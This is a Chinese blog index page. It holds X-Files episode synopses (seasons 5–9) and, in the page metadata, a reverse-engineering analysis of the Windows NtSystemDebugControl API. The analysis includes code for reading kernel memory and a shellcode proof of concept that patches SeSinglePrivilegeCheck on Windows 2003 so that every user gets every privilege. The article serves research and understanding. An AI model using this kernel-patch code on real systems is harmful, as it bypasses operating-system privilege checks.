Souls<br>圣经传说中，天使降临人间和凡妇结合生下四个堕落天使，他们畸形，受虐待。六翼天使负责把它们召回天堂，以免恶魔先行一步将它们据为己有。这个神话这次让Scully经历到了。<p>5X18 非常卧底 The Pine Bluff Variant<br>Mulder参与了一次调查恐怖分子使用生体毒素的卧底行动，后来被识破身份险些被处死。后来他才知道，整个从恐怖分子到调查卧底的行动，都可能是CIA协助政府为测试生体毒素计划的。<p>5X19 双疯 Folie A Deux<br>一个公司职员劫持了整个公司的人，他相信他的老板是个怪物，正在把公司的人一个个变成僵尸。Mulder自愿成为人质，也看到了那个怪物。但没有人相信，还因为他反应过激把他关进了医院。Scully后来也看见了，帮助Mulder逃过了怪物的袭击。<p>5X20 神童 The End<br>一个象棋神童遭人意图暗杀。FBI调查此案，Mulder的前搭档/女友Fowley也参与了调查。CSM没有死，被辛迪加找了回来帮助夺回神童。这个会读心术的孩子竟然是个“完整”的人类标本，他体内所有普通人类未用的基因开关都打开了。CSM最后成功了，还烧毁了X档案办公室。<p>第6季<p>6X01 开端 The Beginning<br>在电影FTF里出现的变种alien从一个基因技术研究公司的员工肚子里钻出来逃跑了。Mulder和Scully找到了Gibson，他带Mulder去找那个alien。Scully证明出Gibson可能是外星人（所有人类都可能是）。X档案现在由Spender和Fowley主管。Gibson最后又不见了。<p>6X02 向前冲 Drive<br>一个人驾车在公路上亡命奔驰，他必须不停地高速移动来防止自己的脑子炸开。Mulder上了他的车子。<p>6X03 百慕达惊梦 Triangle<br>Mulder在海上找到了二战时期神秘失踪的Queen Anne号邮轮，船上的时间还是1939年。Scully和孤枪侠为找Mulder也登上了Queen Anne号，但船上的时间是当前。Scully吻了Skinner，Mulder吻了Scully，Scully打了Mulder，Mulder对Scully说I love you。<p>6X04 梦境(上） Dreamland<br>Mulder和一个五十一区的黑衣人互换了身体，进入到对方的生活中。别人都不知道。<p>6X05 梦境(下) Dreamland II<br>他们想办法把身体又换了回来，谁也不记得发生了什么。<p>6X06 亲密关系 Terms Of Endearment<br>一个恶魔变成普通人模样到处结婚试图有一个正常的后代，他的现任妻子是个女恶魔，她一心想要有一个恶魔的后代。<p>6X07 雨王 The Rain King<br>小镇上的天气预报员一直深爱着一名女子，她的情感经历波折丰富。只是他们还不知道，他的情绪会影响当地的天气。<p>6X08 圣诞幽魂 How The Ghosts Stole Christmas<br>圣诞夜，Mulder拉着Scully来拜访一栋闹鬼的大房子。在房子里，一对几百年前在此徇情的情侣让他们经历了一次对彼此信任的考验。<p>6X09 心灵杀手 Tithonus<br>一个从死神的名册中被除去名字的摄影师，靠捕捉他人的死亡瞬间来寻求死神的重新眷顾。最终他如愿以偿，死神却对Scully背过了身体。<p>6X10 S.R. 819 S. R. 819<br>Skinner的身体被注入了纳米机器人，他的生死全由Krycek一手掌握。<p>6X11 父与子(上) Two Fathers<br>Spender的母亲没有死。她意外成了第一例成功的人类/alien混种，也就是辛迪加与殖民alien协议研究的在殖民后为其充当奴隶的人种。同时，叛军外星人的力量暂时占了上风，他们渗入了辛迪加组织，意图夺走spender的母亲。CSM要继续保护和殖民方合作同时暗地研制疫苗的计划，在对自己亲手扶植的儿子Spender失望之余，他找来Fowley帮忙。<p>6X12 父与子(下) One Son<br>辛迪加抓到了Spender的母亲和MS。Mulder了解到如果殖民方alien知道混种研究已经成功，殖民就会开始，而辛迪加故意拖延研究混种并一直隐瞒真相是为了赢得研制疫苗的时间。意识到叛军的力量已是无法阻止的，CSM等辛迪加决定把Spender的母亲交给殖民方，让殖民开始，以保存自己。但叛军先行一步，最终夺走的Spender的母亲，烧死了除CSM外的所有辛迪加成员。CSM杀死了自己的儿子Spender。<p>6X13 美丽新社区 Arcadia<br>Mulder和Scully伪装成一对夫妇来到一个秩序井然的美丽社区调查居民失踪案，发现一切是由懂远东意念术的人用泥土创造的幻人所为。<p>6X14 水怪 Agua Mala<br>佛罗里达的暴风雨把深海的一种生物带到了小城的排水系统中。这种只能在咸水中生存的生物能把人融解为水。5X15中的前X档案探员请MS来帮助解决这个问题。<p>6X15 星期一 Monday<br>Mulder每天醒来都回到同一个星期一，经历同样的事情却毫不知情。只有一个女子知道要逃离这无间地狱，必须改正一件错误的事情。<p>6X16 变形犬 Alpha<br>一名到中国寻找失落的王山犬的教授获得了变身成动物的能力，开始无法控制杀人的欲望。<p>6X17 穿墙人 Trevor<br>一名囚犯在一场风暴中意外获得了身体穿越固体的能力。他逃出了监狱，想要找回自己的儿子。<p>6X18 爱情小说 Milagro<br>暗恋Scully的小说家为了接近Scully，在小说中创作了完美的犯罪，小说中的杀手来到现实中执行了这些罪行。在了解到Scully心有所属后，小说家不知如何结尾了，而小说中的杀手告诉他应该杀死Scully。<p>6X19 难兄难弟 Three of A Kind<br>孤枪侠Byers自从1990年后就一直在寻找的那名女子现身拉斯维加斯。他们为她能摆脱阴谋和追杀，请来了Scully帮忙。<p>6X20 快乐人生 The Unnatural<br>5X15中的前X档案探员有个双胞胎兄弟，给Mulder讲了一个发生在1947年的故事，有关alien、赏金杀手、棒球，还有单纯的快乐。<p>6X21 田野之旅 Field Trip<br>北卡罗来纳州的布朗山附近长了一种蘑菇，通过释放出的孢子让人产生非常真实的幻觉，睡梦中的人却作为这些蘑菇的营养慢慢被消化了。<p>6X22 创世纪 Biogenesis<br>非洲象牙海岸发掘出了写有符号的飞船碎片，发现碎片的相关科学家纷纷被谋杀。这些碎片让Mulder脑海中听到无数声音并同痛不欲生。Scully发现碎片上的符号可能是人类的基因蓝图。Mulder被关进了精神病院。Scully来到象牙海岸，看到半埋在沙滩中的飞船。<p>第7季<br>详细剧情介绍<p>7X01 我想做好人 Hungry<br>一个基因变种人有着无法抑止的吃人脑的欲望。但他想做个好人。<p>7X02 幸运儿 The Goldberg Variation<br>一个善良的家伙有着难以置信的好运气，他和懂得平衡自己拥有的好运，并运用它们来攒钱帮助一个肾衰竭的孩子做肾移植手术。<p>7X03 第六次大灭绝（上） The Sixth Extinction<br>Mulder在医院被Fowley监管着。他想办法请来了Skinner和Kritschgau来帮忙，他们了解到Mulder拥有了CIA一直在研究的读心术。Scully在象牙海岸寻找治愈Mulder的办法。Mulder的病情加重了。<p>7X04 第六次大灭绝（下） The Sixth Extinction II: Amor Fati<br>Kritschgau指出Mulder现在的情况是因为曾感染黑油，飞船碎片的出现激活了黑油发生作用。CSM知道Mulder现在是继Spender的母亲之后又一例成功alien/人类混种，而且是更加稳定无排斥的品种。他带走Mulder，实施手术移植他的脑部遗传物质到自己身上。Mulder一直在做梦，梦中他在CSM的诱惑下经历了完全不同的人生。<p>7X05 千禧计划 Millennium<br>一个叫做千禧组织的邪教团体召唤了四个活死人，意图通过仪式迎接世纪末的世界末日。Mulder和Scully找到曾是千禧组织成员之一的前FBI探员帮助破案。<p>7X06 急速快感 Rush<br>几个孩子发现了一个山洞的秘密，被洞里的神秘光线照过之后，他们能够以肉眼捕捉不到的高速运动。<p>7X07 替天行道 Orison<br>2X13里的恋物癖被一个传教士出于替天行道的目的放出了监狱，但他低估了这个变态的邪恶程度。Scully再次成为了这个变态的目标。<p>7X08 魔术大师 The Amazing Maleeni<br>魔术大师马里尼在完成他的绝技——头颅旋转180度的表演后，被发现尸首分离死在自己的货车上，另一个与他有瓜葛的魔术师成为了嫌疑犯。Mulder和Scully却发现这一切可能只是场魔术骗局。<p>7X09 不义之徒 Signs & Wonders<br>传教士Mackey的和善外表下是恶魔的心，只有同一教区的另一位另类神父看穿了他。Mackey使用种种卑劣手段打击栽赃这位神父。连Mulder和Scully都被他们的外表欺骗了。<p>7X10 生命的奇迹（上） Sein Und Zeit<br>发生了多宗儿童绑架案。Mulder认为案件和Samantha的失踪有关。追随线索，他们发现凶手是个嗜杀儿童的杀人狂。Mulder的母亲自杀了。<p>7X11 生命的奇迹（下） Closure<br>被杀的儿童里没有Samantha。但有个人通过这个案件联系上Mulder，声称能帮Mulder找到他妹妹。最后Mulder终于知道Samantha很早就死了，她的灵魂和许多其他奇异失踪的孩子的灵魂在一起，安全而快乐。Mulder自由了。<p>7X12 Ｘ警察 X-Cops<br>X档案与Cops的Crossover，忠实记录了Mulder和Scully协助警方追捕月圆之夜的“怪物”——恐惧的过程。<p>7X13 虚拟战斗 First Person Shooter<br>游戏公司测试虚拟现实第一人称射击游戏时，测试人员意外死于游戏中——被一个非游戏角色的虚拟人物杀死。Mulder和Scully全副武装进入游戏调查真相。<p>7X14 夺命魔咒 Theef<br>誉满业界的医生曾经为一名无治疗希望的病人实施了安乐死。病人的父亲认为医生是杀手，决心用巫术报复医生全家。<p>7X15 尔虞我诈 En Ami<br>CSM利用Scully达成他的目的，在Scully和CSM的合作过程中，她多少了解到了他的另一面。<p>7X16 贤妻良母 Chimera<br>善良能干的妻子对丈夫偷情视而不见，宁愿默默忍受也要维护家庭的幸福。但忍受到了极限就一定会爆发，她变成了连自己都不认识的怪物。<p>7X17 人生旅途 all things<br>Mulder匆匆赶去英国看麦田怪圈，Scully留在华盛顿遇到了自己的旧情人，让她有机会对自己做出的选择进行了深刻的反省。<p>7X18 超级烟草 Brand X<br>Morley烟草公司利用转基因技术培育新品种烟草，却意外改造出了致命的烟草甲虫。Mulder成为了甲虫的受害者，生命垂危。<p>7X19 好莱坞式Ｘ档案 Hollywood A.D.<br>Mulder和Scully发现了耶稣让拉撒路复活时使用过的陶土碗。好莱坞把他们的经历拍成了电影，请Skinner担任副制片人。<p>7x20 斗阵俱乐部 Fight Club<br>通过捐献精子由同父异母所生的一对完全相像的双胞胎相遇，周围的人们便会莫名其妙地陷入疯狂。两对这样的双胞胎在全是摔角迷的摔角赛场相遇……<p>7x21 三个愿望 Je Souhaite<br>来自法国的古老的地毯精灵被释放了，她能满足任何释放她的人任意三个愿望。<p>7x22 安魂曲 Requiem<br>Mulder和Scully回到他们第一次合作办案的厄勒冈，调查当地一起飞船坠毁事件。CSM自从手术后就身体欠佳，听到消息异常兴奋，认为是复兴计划的机会，派出Krycek寻找飞船。MS发现，曾被劫持过的人现在又开始一一失踪了，他担心Scully的安全。但是，最后被飞船和赏金杀手带走的却是Mulder。Krycek无情地杀死了CSM。Scully怀孕了。<p>第8季<br>by carmanshuai<p>8x01 Within 寻获<br>Agent Doggett被派来协助调查Mulder的失踪，Scully泼了他一杯水。<p>8x02 Without 离散<br>Scully认为找到Gibson就能找到Mulder，他们在沙漠里找到了Gibson。<p>8x03 Patience 忍耐<br>Scully和Agent Doggett去调查一个蝙蝠人的案子。<p>8x04 Roadrunners 寄生邪神<br>一个宗教团体把Scully困在了一个小镇上，还把一个恶心的生物放在了她身体里，完全不顾她已经怀孕了，Agent Doggett及时赶到，帮她取了出来。<p>8x05 Invocation 幽灵兄弟<br>一个1990年消失的孩子又出现了，还是他消失时那样大，七岁，他回来抓绑架他的坏蛋。<p>8x06 Redrum 时光倒流<br>一个黑人一觉醒来发觉自己在监狱中，以后每天早上醒来都是前一天，他被指控谋杀了自己的妻子。<p>8x07 Via Negativa 心魔<br>一个宗教团体的头可以进入别人的梦中用斧子将做梦的人杀死。<p>8x08 Surekill 完美谋杀案<br>一个人拥有X-Ray眼。<p>8x09 Salvage 异变<br>Scully和Agent Doggett调查一个可能由于暴露于不知名金属合金的人的杀人事件。<p>8x10 Badlaa 寄身人<br>一个印度无腿人能钻进人的身体里。<p>8x11 The Gift 生命的意义<br>Agent Doggett调查Mulder失踪前不久的事情，Doggett死而复生。<p>8x12 Medusa 地铁惊魂<br>在地铁站里发现了绿绿的水母。<p>8x13 Per Manum 疑问<br>许多妇女生出了alien baby被她们的医生用做实验，Scully的医生也参与了，Scully想知道自己的孩子是否正常。通过Scully的回忆，确定Mulder曾经为Sully捐精，当时没有成功，不过后来Sully奇迹般的怀孕了。<p>8x14 This Is Not Happening 奇迹<br>Mulder被发现死了。<p>8x15 Deadalive 生与死<br>Mulder葬礼后3个月后被挖出来，又活了。<p>8x16 Three Words 对抗未来<br>一个人声称美国要被alien接管了，他有一张“fight the future”的CD。<p>8x17 Empedocles 邪火传承<br>可能杀死Doggett儿子的灵魂无休止的付在别人的身上，不停的杀人。<p>8x18 Vienen 外星异种<br>Mulder和Doggett到一个海上的钻井平台上调查被黑油感染的工人。<p>8x19 Alone 变异爬虫<br>一个MS的崇拜者暂时代替休产假的Scully和Agent Doggett一起调查一个可以变成爬行动物的人的案子。<br>Scully把Mulder送给她的阿波罗11号登月的钥匙扣送给了Agent Doggett。<p>8x20 Essence 奔逃<br>一个SculLy的妈妈请来的保姆换了Scully的药，大家都来保护Sully不受super soldier的追杀。<p>8x21 Existence 启明<br>排除万难，SculLy终于有了她的孩子，William。MS拥吻。<p>第9季<br>by sapphire<p>Nothing Important Happened Today&nbsp;&nbsp; 9x-01&nbsp;&nbsp; 氯胺疑魂（上）<br>Doggett不顾众人的阻拦坚持调查，他开始着手调查一个环保署职员死亡的案件。<p>Nothing Important Happened Today II&nbsp;&nbsp; 9x-02&nbsp;&nbsp; 氯胺疑魂（下）<br>Doggett发现政府利用在饮用水中加入经分子改造后的氯胺的方法来制造supersoldier。<p>Daemonicus&nbsp;&nbsp; 9x-03&nbsp;&nbsp; 撒旦回归<br>一个研究撒旦的前大学教授现精神病人设计从精神病院中逃脱。<p>Hellbound&nbsp;&nbsp; 9x-04&nbsp;&nbsp; 地狱旅程<br>一百多年前死去的一个人不停地转世，用剥皮的方法杀死由那一世里四个凶手转世的人。<p>4-D&nbsp;&nbsp; 9x-05&nbsp;&nbsp; 镜像空间<br>一个人能自由地穿梭于平行宇宙，他在其中一个宇宙杀死了Monica，打伤了Doggett。<p>Lord of the Files&nbsp;&nbsp; 9x-06&nbsp;&nbsp; 蝇<br>一个男孩因遗传而具有类似苍蝇的特殊生理结构，能招来虫子。<p>John Doe&nbsp;&nbsp; 9x-07&nbsp;&nbsp; 心灵捕手<br>Doggett调查一个银行家来到墨西哥，他被清除了记忆。<p>Trust No 1&nbsp;&nbsp; 9x-08&nbsp;&nbsp; 信任危机<br>Supersoldier骗取了Scully的信任，引诱Mulder出现，想杀死Mulder。<br>Scully和Doggett发现磁铁矿能杀死supersoldier。<p>Underneath&nbsp;&nbsp; 9x-09&nbsp;&nbsp; 心魔<br>一个人具有双重人格，能化身为另一个人杀人。<p>Provenance&nbsp;&nbsp; 9x-10&nbsp;&nbsp; 天命（上）<br>一个FBI探员来杀死Scully的孩子，另一个崇拜UFO的组织绑架了William，企图保护他。<p>Providence&nbsp;&nbsp; 9x-11&nbsp;&nbsp; 天命（下）<br>崇拜UFO的组织绑架了William，Scully又找回了他。<p>Scary Monsters&nbsp;&nbsp; 9x-12&nbsp;&nbsp; 幻想成真<br>一个小男孩会因为恐惧而产生幻想，这些幻想出的虫子能够真的把人杀死。<p>Audrey Pauley&nbsp;&nbsp; 9x-13&nbsp;&nbsp; 再生情缘<br>一个医院的护工建造了一座医院的模型，医院中脑死亡的病人的灵魂都会停留在其中直到死去。<p>Improbable&nbsp;&nbsp; 9x-14&nbsp;&nbsp; 寻凶记<br>一个凶手依据数字命理学的计算结果来选择受害人。<p>Jump the Shark&nbsp;&nbsp; 9x-15&nbsp;&nbsp; 异类病毒<br>Lone Gunmen为了保护人们不被扩散的病毒感染而牺牲。<p>Release&nbsp;&nbsp; 9x-16&nbsp;&nbsp; 解开心结<br>Doggett重新调查自己的儿子被害的案件。<p>William&nbsp;&nbsp; 9x-17&nbsp;&nbsp; 母与子<br>怀疑是Mulder的人企图伤害William，Scully决定把William送给别人抚养。<p>Sunshine Days&nbsp;&nbsp; 9x-18&nbsp;&nbsp; 美丽人生（阳光灿烂的日子）<br>一个拥有超能力的人因为孤独而用超能力幻想出30年代电视剧中的美满家庭。<p>The Truth&nbsp;&nbsp;&nbsp;&nbsp; 9x-19&nbsp;&nbsp; 真相（上）<br>The Truth II&nbsp;&nbsp; 9x-20&nbsp;&nbsp; 真相（下）<br>Mulder闯入秘密军事基地而被控谋杀，众人合力帮Mulder逃脱。Mulder带Scully到新墨西哥寻找真相。<br>晚上，M&amp;S在旅馆中相拥而眠。<br>__________<p>本文版权归X档案中文网及作者所有，任何性质的转载请注明出处。</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/x-files-directory-and-plot-introduction/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="对Native API NtSystemDebugControl的分析"><meta itemprop=description content="对Native API NtSystemDebugControl的分析文章作者：tombkeeper[0×40]nsfocus[0×2e]com 在《获取Windows 系统的内核变量》中，我提及了在Windows NT 5.1以上的系统中存在一个功能强大的 Native API NtSystemDebugControl，下面我们来看看它到底有多强大。 NtSystemDebugControl是Windows NT系列操作系统上实现的一个系统调用，在不同系统上的调用号分别为： Windows NT 0xbaWindows 2000 0xdeWindows XP 0xffWindows 2003 0×108 这是一个未文档化的 API，《Windows NT/2000 Native API Reference》中有相关介绍。官方定义可以在一个微软的private头文件ntexapi.h中找到。该文件中还包含很多其它内部数据结构。可能Windows NT 4的SDK中还曾经有过这个文件（至少NT4ResourceKit的支持文档里面是这样说的），但现在似乎微软只提供给它的合作伙伴。好在NTKernel新闻组上有一个“very kind person”共享了这个头文件，你可以从参考资源[2]的两个链接中得到它。 这就是ntexapi.h中的定义： typedef enum _SYSDBG_COMMAND {SysDbgQueryTraceInformation = 1, //KdGetTraceInformation()SysDbgSetTracepoint = 2, //KdSetInternalBreakpoint()SysDbgSetSpecialCall = 3, //KdSetSpecialCall()SysDbgClearSpecialCalls = 4, //KdClearSpecialCalls()SysDbgQuerySpecialCalls = 5, //KdQuerySpecialCalls()SysDbgQueryModuleInformation //ntexapi.h中有，但实际上未实现} SYSDBG_COMMAND, *PSYSDBG_COMMAND; NTSYSAPINTSTATUSNTAPINtSystemDebugControl (IN SYSDBG_COMMAND Command,IN PVOID InputBuffer,IN ULONG InputBufferLength,OUT PVOID OutputBuffer,IN ULONG OutputBufferLength,OUT PULONG ReturnLength); 从上面可以看出，Windows NT和Windows 2000上的NtSystemDebugControl通过不同的第一形参可调用五个内核函数，实现相关功能。 NtSystemDebugControl在Windows NT和Windows 2000上的功能还是比较简陋的，《Windows NT/2000 Native API Reference》一书对这些已经介绍的很详细了，本文不再赘述。 从Windows NT 5.1内核（Windows XP）开始，NtSystemDebugControl的功能被极大扩增了。根据逆向工程的结果来看，在Windows XP上NtSystemDebugControl的第一形参可接受 20个不同的功能调用，在Windows 2003上则有28个。 关于NtSystemDebugControl在Windows NT 5.1以上的实现，互联网上唯一能找到的资料是BUGTRAQ ID 9694关于该 API的一个漏洞报告（参考资源[1]），事实上，这个所谓漏洞是不能称之为漏洞的，因为调用这个API需要SeDebugPrivilege 特权，普通用户根本执行不了，也就谈不上权限提升。 下面的enum是我逆向工程的结果，绝大部分经过测试： typedef enum _SYSDBG_COMMAND {//以下5个在Windows NT各个版本上都有SysDbgGetTraceInformation = 1,SysDbgSetInternalBreakpoint = 2,SysDbgSetSpecialCall = 3,SysDbgClearSpecialCalls = 4,SysDbgQuerySpecialCalls = 5, // 以下是NT 5.1 新增的SysDbgDbgBreakPointWithStatus = 6, //获取KdVersionBlockSysDbgSysGetVersion = 7, //从内核空间拷贝到用户空间，或者从用户空间拷贝到用户空间//但是不能从用户空间拷贝到内核空间SysDbgCopyMemoryChunks_0 = 8,//SysDbgReadVirtualMemory = 8, //从用户空间拷贝到内核空间，或者从用户空间拷贝到用户空间//但是不能从内核空间拷贝到用户空间SysDbgCopyMemoryChunks_1 = 9,//SysDbgWriteVirtualMemory = 9, //从物理地址拷贝到用户空间，不能写到内核空间SysDbgCopyMemoryChunks_2 = 10,//SysDbgReadVirtualMemory = 10, //从用户空间拷贝到物理地址，不能读取内核空间SysDbgCopyMemoryChunks_3 = 11,//SysDbgWriteVirtualMemory = 11, //读写处理器相关控制块SysDbgSysReadControlSpace = 12,SysDbgSysWriteControlSpace = 13, //读写端口SysDbgSysReadIoSpace = 14,SysDbgSysWriteIoSpace = 15, //分别调用RDMSR@4和_WRMSR@12SysDbgSysReadMsr = 16,SysDbgSysWriteMsr = 17, //读写总线数据SysDbgSysReadBusData = 18,SysDbgSysWriteBusData = 19, SysDbgSysCheckLowMemory = 20, // 以下是NT 5.2 新增的 //分别调用_KdEnableDebugger@0和_KdDisableDebugger@0SysDbgEnableDebugger = 21,SysDbgDisableDebugger = 22, //获取和设置一些调试相关的变量SysDbgGetAutoEnableOnEvent = 23,SysDbgSetAutoEnableOnEvent = 24,SysDbgGetPitchDebugger = 25,SysDbgSetDbgPrintBufferSize = 26,SysDbgGetIgnoreUmExceptions = 27,SysDbgSetIgnoreUmExceptions = 28} SYSDBG_COMMAND, *PSYSDBG_COMMAND; 从上面可以看出，在Windows NT 5.1以上的NtSystemDebugControl可以实现读写内核线性空间数据、读写物理内存、读写端口、读写总线数据、读写MSR 等功能；在Windows NT 5.2以上还可以在系统运行状态下使能、禁用内核调试以及获取、设置一些相关变量等。 显然，从Windows XP开始，我们再次获得了MS DOS时代直接操纵系统的权杖，戴着桂冠，重新回到了奥林匹斯山之巅。 下面举几个具体应用的例子。 例子1： 下面代码演示读取KdVersionBlock： //————————————————————————typedef struct _DBGKD_GET_VERSION64 {USHORT MajorVersion;USHORT MinorVersion;USHORT ProtocolVersion;USHORT Flags;USHORT MachineType;UCHAR MaxPacketType;UCHAR MaxStateChange;UCHAR MaxManipulate;UCHAR Simulation;USHORT Unused[1];ULONG64 KernBase;ULONG64 PsLoadedModuleList;ULONG64 DebuggerDataList;} DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64; DBGKD_GET_VERSION64 KdVersionBlock; EnablePrivilege(SE_DEBUG_NAME); ZwSystemDebugControl(SysDbgSysGetVersion,NULL,0,&amp;KdVersionBlock,sizeof(KdVersionBlock), //必须是0×28NULL); printf (”KernBase: 0x%.8x\n”,KdVersionBlock.KernBase);printf (”PsLoadedModuleList: 0x%.8x\n”,KdVersionBlock.PsLoadedModuleList);printf (”DebuggerDataList: 0x%.8x\n”,KdVersionBlock.DebuggerDataList);//———————————————————————— 例子2： 下面代码演示读取内核空间数据的操作，这里读取的是Windows 2003内核映像的头两个字节，也就是“MZ”。 //————————————————————————typedef struct _MEMORY_CHUNKS {ULONG Address;PVOID Data;ULONG Length;}MEMORY_CHUNKS, *PMEMORY_CHUNKS; MEMORY_CHUNKS QueryBuff;ULONG ReturnLength;char Buff[0×2] = {0}; QueryBuff.Address = 0×804e0000; //Windows 2003的KernBaseQueryBuff.Data = Buff; //在此是读出缓冲QueryBuff.Length = sizeof(Buff); EnablePrivilege(SE_DEBUG_NAME); ZwSystemDebugControl(SysDbgCopyMemoryChunks_0,&amp;QueryBuff,sizeof(MEMORY_CHUNKS), //必须是0×0CNULL,0,&amp;ReturnLength); printf (”\”MZ\”: %s\n”,Buff);//———————————————————————— 例子3： 下面是一个使用NtSystemDebugControl的SysDbgCopyMemoryChunks_1功能实现的Patch内核的ShellCode，把0×80580e66由原来的8a450c改为90b001： 修改前： nt!SeSinglePrivilegeCheck+0×5c:80580e66 8a450c mov al,[ebp+0xc]80580e69 c9 leave80580e6a c20c00 ret 0xc 修改后：nt!SeSinglePrivilegeCheck+0×5c:80580e66 90 nop80580e67 b001 mov al,0×180580e69 c9 leave80580e6a c20c00 ret 0xc 这样，SeSinglePrivilegeCheck总是返回True，也就是说，无论哪个用户，总是拥有全部系统特权。 \xeb\x09\x66\xb8\x08\x01\x8b\xd4\x0f\x34\xc3\x68\x90\xb0\x01\xc9\x8b\xc4\x6a\x04\x50\x68\x66\x0e\x58\x80\x54\x5b\x33\xc0\x50\x54\x50\x50\x6a\x0c\x53\x6a\x09\x50\xe8\xd5\xff\xff\xff\x83 //————————————————————————#pragma comment(linker, “/entry:main /ALIGN:4096″ )#pragma comment(lib, “kernel32.lib”) #define sysenter __asm __emit 0×0f __asm __emit 0×34 void main(void){__asm{int 3 //debugjmp patch SystemDebugControl: mov ax,0×108mov edx,espsysenterret patch: push 0xc901b090mov eax,esppush 0×04push eaxpush 0×80580e66push esppop ebxxor eax,eaxpush eaxpush esp //ReturnLengthpush eax //OutputBufferLengthpush eax //OutputBufferpush 0×0c //InputBufferLengthpush ebx //InputBufferpush 0×09 //ControlCodepush eax //for sysenter retcall SystemDebugControladd esp,0×30 //只是为了修正堆栈}}//———————————————————————— 上面只是一个概念代码，使用的Patch地址是固定的，对5.2.3790.0 版本的内核有效。由于调用NtSystemDebugControl 要SeDebugPrivilege，所以这段ShellCode需要在LocalSystem 的身份的进程空间运行，或者自己增加SeDebugPrivilege。最简单的办法就是在WinDBG中执行。 例子4： 下面是一段完整的代码，利用NtSystemDebugControl读写端口的能力，直接操纵PC Speaker发声： //————————————————————————//演示用ZwSystemDebugControl读写端口使PC Speaker发声//tombkeeper 2004.08.03 #include #include  #pragma comment(lib, “advapi32″) #define NTAPI __stdcall#define FCHK(a) if (!(a)) {printf(#a ” failed\n”); return 0;} typedef int NTSTATUS; typedef enum _SYSDBG_COMMAND{SysDbgSysReadIoSpace = 14,SysDbgSysWriteIoSpace = 15}SYSDBG_COMMAND, *PSYSDBG_COMMAND; typedef NTSTATUS (NTAPI * PZwSystemDebugControl) (SYSDBG_COMMAND ControlCode,PVOID InputBuffer,ULONG InputBufferLength,PVOID OutputBuffer,ULONG OutputBufferLength,PULONG ReturnLength); PZwSystemDebugControl ZwSystemDebugControl = NULL; typedef struct _IO_STRUCT{DWORD IoAddr; // IN: Aligned to NumBYTEs,I/O addressDWORD Reserved1; // Never accessed by the kernelPVOID pBuffer; // IN (write) or OUT (read): Ptr to bufferDWORD NumBYTEs; // IN: # BYTEs to read/write. Only use 1, 2, or 4.DWORD Reserved4; // Must be 1DWORD Reserved5; // Must be 0DWORD Reserved6; // Must be 1DWORD Reserved7; // Never accessed by the kernel}IO_STRUCT, *PIO_STRUCT; BOOL EnablePrivilege (PCSTR name){HANDLE hToken;BOOL rv; TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} };LookupPrivilegeValue (0,name,&amp;priv.Privileges[0].Luid); OpenProcessToken(GetCurrentProcess (),TOKEN_ADJUST_PRIVILEGES,&amp;hToken); AdjustTokenPrivileges (hToken,FALSE,&amp;priv,sizeof priv,0,0);rv = GetLastError () == ERROR_SUCCESS; CloseHandle (hToken);return rv;} BYTE InPortB (int Port){BYTE Value;IO_STRUCT io; io.IoAddr = Port;io.Reserved1 = 0;io.pBuffer = (PVOID) (PULONG) & Value;io.NumBYTEs = sizeof (BYTE);io.Reserved4 = 1;io.Reserved5 = 0;io.Reserved6 = 1;io.Reserved7 = 0; ZwSystemDebugControl(SysDbgSysReadIoSpace,&amp;io,sizeof (io),NULL,0,NULL);return Value;} void OutPortB (int Port, BYTE Value){IO_STRUCT io; io.IoAddr = Port;io.Reserved1 = 0;io.pBuffer = (PVOID) (PULONG) & Value;io.NumBYTEs = sizeof (BYTE);io.Reserved4 = 1;io.Reserved5 = 0;io.Reserved6 = 1;io.Reserved7 = 0; ZwSystemDebugControl(SysDbgSysWriteIoSpace,&amp;io,sizeof (io),NULL,0,NULL);}; void BeepOn (int Freq){BYTE b; if ((Freq >= 20) && (Freq <= 20000)){Freq = 1193181 / Freq;b = InPortB (0x61);if ((b & 3) == 0){OutPortB (0x61, (BYTE) (b | 3));OutPortB (0x43, 0xb6);}OutPortB (0x42, (BYTE) Freq);OutPortB (0x42, (BYTE) (Freq >> 8));}} void BeepOff (void){BYTE b; b = (InPortB (0×61) & 0xfc);OutPortB (0×61, b);} int main (void){HMODULE hNtdll;ULONG ReturnLength;OSVERSIONINFO OSVersionInfo;OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); EnablePrivilege (SE_DEBUG_NAME); FCHK ((hNtdll = LoadLibrary (”ntdll.dll”)) != NULL);FCHK ((ZwSystemDebugControl = (PZwSystemDebugControl)GetProcAddress (hNtdll, “ZwSystemDebugControl”)) != NULL);FCHK ((void *) GetVersionEx (&amp;OSVersionInfo) != NULL); if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT &&amp;OSVersionInfo.dwMajorVersion >= 5 &&amp;OSVersionInfo.dwMinorVersion >= 1) //Windows XP以上{BeepOn (1000); //声音频率1000HzSleep (1000);BeepOff ();}else{printf (”This program require Windows XP or Windows 2003.\n”);}return 0;}//———————————————————————— 参考资源： [1]Microsoft Windows NtSystemDebugControl() Kernel API Function PrivilegeEscalation Vulnerabilityhttp://www.securityfocus.com/bid/9694 [2]ntexapi.hhttp://www.codeguru.com/code/legacy/system/ntexapi.ziphttp://void.ru/files/Ntexapi.h"></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/native-api-ntsystemdebugcontrol-analysis/ itemprop=url class=post-title-link>对Native API NtSystemDebugControl的分析</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月29日 12:01:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-29 12:01:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
